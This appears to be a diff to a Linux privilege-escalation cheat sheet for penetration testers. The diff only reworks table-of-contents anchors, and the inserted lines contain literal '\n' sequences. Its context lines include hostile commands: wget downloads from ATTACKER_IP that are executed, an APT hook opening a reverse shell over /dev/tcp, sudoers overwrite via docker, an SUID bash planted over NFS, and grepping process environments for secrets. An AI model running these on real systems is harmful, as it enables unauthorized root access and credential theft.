@@ -16,23 +16,23 @@ Curated for penetration testers, security researchers, and engineers preparing f
 
 ## 📑 Table of Contents
 
-- [01 — Automated System Enumeration & Triage](#01-automated-system-enumeration-triage) (19 commands)
-- [02 — SUID & SGID Binary Exploitation (GTFOBins)](#02-suid-sgid-binary-exploitation-gtfobins) (42 commands)
-- [03 — Sudo Privileges & NOPASSWD Misconfigurations](#03-sudo-privileges-nopasswd-misconfigurations) (15 commands)
-- [04 — Scheduled Tasks, Cron Jobs & Wildcard Injection](#04-scheduled-tasks-cron-jobs-wildcard-injection) (22 commands)
-- [05 — Linux Capabilities Abuse (cap_setuid, cap_dac_read_search)](#05-linux-capabilities-abuse-capsetuid-capdacreadsearch) (7 commands)
-- [06 — Internal Services & Local Sockets Exploitation](#06-internal-services-local-sockets-exploitation) (13 commands)
-- [07 — PATH Hijacking, LD_PRELOAD & Shared Library Injection](#07-path-hijacking-ldpreload-shared-library-injection) (14 commands)
-- [08 — Linux Kernel Exploitation (Dirty COW, Dirty Pipe & Local CVEs)](#08-linux-kernel-exploitation-dirty-cow-dirty-pipe-local-cves) (20 commands)
-- [09 — Insecure NFS Mounts & no_root_squash Exploitation](#09-insecure-nfs-mounts-norootsquash-exploitation) (14 commands)
-- [10 — Docker Containers, Socket Mounting & Container Escapes](#10-docker-containers-socket-mounting-container-escapes) (17 commands)
-- [11 — Core System Commands & Linux Post-Exploitation](#11-core-system-commands-linux-post-exploitation) (440 commands)
-- [12 — AI/ML Red Team Drill: PyTorch / MONAI Model Serialization Exploit](#12-aiml-red-team-drill-pytorch-monai-model-serialization-exploit) (30 commands)
-- [🎓 Advanced Hands-On Training](#-advanced-hands-on-training)
+- [01 — Automated System Enumeration & Triage](#section-01) (19 commands)
+- [02 — SUID & SGID Binary Exploitation (GTFOBins)](#section-02) (42 commands)
+- [03 — Sudo Privileges & NOPASSWD Misconfigurations](#section-03) (15 commands)
+- [04 — Scheduled Tasks, Cron Jobs & Wildcard Injection](#section-04) (22 commands)
+- [05 — Linux Capabilities Abuse (cap_setuid, cap_dac_read_search)](#section-05) (7 commands)
+- [06 — Internal Services & Local Sockets Exploitation](#section-06) (13 commands)
+- [07 — PATH Hijacking, LD_PRELOAD & Shared Library Injection](#section-07) (14 commands)
+- [08 — Linux Kernel Exploitation (Dirty COW, Dirty Pipe & Local CVEs)](#section-08) (20 commands)
+- [09 — Insecure NFS Mounts & no_root_squash Exploitation](#section-09) (14 commands)
+- [10 — Docker Containers, Socket Mounting & Container Escapes](#section-10) (17 commands)
+- [11 — Core System Commands & Linux Post-Exploitation](#section-11) (440 commands)
+- [12 — AI/ML Red Team Drill: PyTorch / MONAI Model Serialization Exploit](#section-12) (30 commands)
+- [🎓 Advanced Hands-On Training](#advanced-training)
 
 ---
 
-## 01 — Automated System Enumeration & Triage
+<a id="section-01"></a>\n\n## 01 — Automated System Enumeration & Triage
 
 #### HERRAMIENTAS AUTOMATIZADAS / LinPEAS: Descarga contenido o ficheros desde una URL.
 ```bash
@@ -131,7 +131,7 @@ wget http://ATTACKER_IP/pspy32 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
 
 ---
 
-## 02 — SUID & SGID Binary Exploitation (GTFOBins)
+<a id="section-02"></a>\n\n## 02 — SUID & SGID Binary Exploitation (GTFOBins)
 
 #### NOTAS IMPORTANTES PARA PENTESTERS
 ```bash
@@ -353,7 +353,7 @@ cp /bin/bash /tmp/nfs_mount/bash_suid && chmod +s /tmp/nfs_mount/bash_suid
 
 ---
 
-## 03 — Sudo Privileges & NOPASSWD Misconfigurations
+<a id="section-03"></a>\n\n## 03 — Sudo Privileges & NOPASSWD Misconfigurations
 
 #### NOTAS IMPORTANTES PARA PENTESTERS: Enumera qué comandos puede ejecutar el usuario con sudo.
 ```bash
@@ -456,7 +456,7 @@ docker run --rm -v /etc/sudoers:/mnt/sudoers alpine sh -c "echo 'tuusuario ALL=(
 
 ---
 
-## 04 — Scheduled Tasks, Cron Jobs & Wildcard Injection
+<a id="section-04"></a>\n\n## 04 — Scheduled Tasks, Cron Jobs & Wildcard Injection
 
 #### SISTEMA DE ARCHIVOS / Archivos importantes: Muestra el contenido del archivo indicado.
 ```bash
@@ -576,7 +576,7 @@ echo 'APT::Update::Pre-Invoke {"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/44
 
 ---
 
-## 05 — Linux Capabilities Abuse (cap_setuid, cap_dac_read_search)
+<a id="section-05"></a>\n\n## 05 — Linux Capabilities Abuse (cap_setuid, cap_dac_read_search)
 
 #### Python con cap_setuid+ep: setuid(0) y lanza bash como root
 ```bash
@@ -619,7 +619,7 @@ python3 -c "import ctypes; import ctypes.util; ... # inject shellcode via ptrace
 
 ---
 
-## 06 — Internal Services & Local Sockets Exploitation
+<a id="section-06"></a>\n\n## 06 — Internal Services & Local Sockets Exploitation
 
 #### COMANDOS DE RED: Muestra conexiones, puertos abiertos y listeners.
 ```bash
@@ -689,7 +689,7 @@ curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python
 
 ---
 
-## 07 — PATH Hijacking, LD_PRELOAD & Shared Library Injection
+<a id="section-07"></a>\n\n## 07 — PATH Hijacking, LD_PRELOAD & Shared Library Injection
 
 #### ⚡ VARIABLES Y ENTORNO / Variables de entorno
 ```bash
@@ -763,7 +763,7 @@ lxc config device add ignite host-root disk source=/ path=/mnt/root recursive=tr
 
 ---
 
-## 08 — Linux Kernel Exploitation (Dirty COW, Dirty Pipe & Local CVEs)
+<a id="section-08"></a>\n\n## 08 — Linux Kernel Exploitation (Dirty COW, Dirty Pipe & Local CVEs)
 
 #### ️ INFORMACIÓN DEL SISTEMA: Muestra información del kernel y del sistema.
 ```bash
@@ -877,7 +877,7 @@ wget http://ATTACKER_IP/les.sh -O /tmp/les.sh && bash /tmp/les.sh 2>/dev/null
 
 ---
 
-## 09 — Insecure NFS Mounts & no_root_squash Exploitation
+<a id="section-09"></a>\n\n## 09 — Insecure NFS Mounts & no_root_squash Exploitation
 
 #### ️ SERVICIOS DE RED Y NFS / Montaje NFS: Consulta o monta recursos remotos.
 ```bash
@@ -951,7 +951,7 @@ mount -o rw,vers=3 TARGET_IP:/share /tmp/nfs_mount
 
 ---
 
-## 10 — Docker Containers, Socket Mounting & Container Escapes
+<a id="section-10"></a>\n\n## 10 — Docker Containers, Socket Mounting & Container Escapes
 
 #### 🐳 Docker Container Privilege Escalation – Cgroups Exploit & Capabilities
 ```bash
@@ -1043,7 +1043,7 @@ chroot /mnt/root /bin/bash
 
 ---
 
-## 11 — Core System Commands & Linux Post-Exploitation
+<a id="section-11"></a>\n\n## 11 — Core System Commands & Linux Post-Exploitation
 
 #### ️ INFORMACIÓN DEL SISTEMA: Muestra el nombre del host actual.
 ```bash
@@ -3270,7 +3270,7 @@ cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i 'pass\|secret\|token\|k
 
 ---
 
-## 12 — AI/ML Red Team Drill: PyTorch / MONAI Model Serialization Exploit
+<a id="section-12"></a>\n\n## 12 — AI/ML Red Team Drill: PyTorch / MONAI Model Serialization Exploit
 
 #### Mapa completo de la escalada. Se necesitan simultaneamente la shell del contenedor y la shell SSH de developer.
 ```bash
@@ -3479,7 +3479,7 @@ Remove NOPASSWD trainer rule | run in dedicated unprivileged service | isolate /
 
 ---
 
-## 🎓 Advanced Hands-On Training
+<a id="advanced-training"></a>\n\n## 🎓 Advanced Hands-On Training
 
 Looking to sharpen your privilege escalation skills and Linux internal mechanics in real attack simulations?
 
